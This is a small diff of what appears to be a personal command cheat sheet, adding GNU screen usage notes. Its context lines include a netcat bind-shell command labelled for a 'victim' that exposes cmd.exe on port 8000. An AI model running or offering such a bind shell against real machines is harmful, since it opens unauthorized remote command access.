@@ -78,6 +78,11 @@ find ./ -inum 919102 -exec rm -rfi {} \;
 #search head file
 apt-file search xxx.h
 
+#screen
+[C-a] D to detach
+screen -ls
+screen -r id
+
 #nc shell
 #the victim listen
 nc.exe -l -p 8000 -t -e cmd.exe
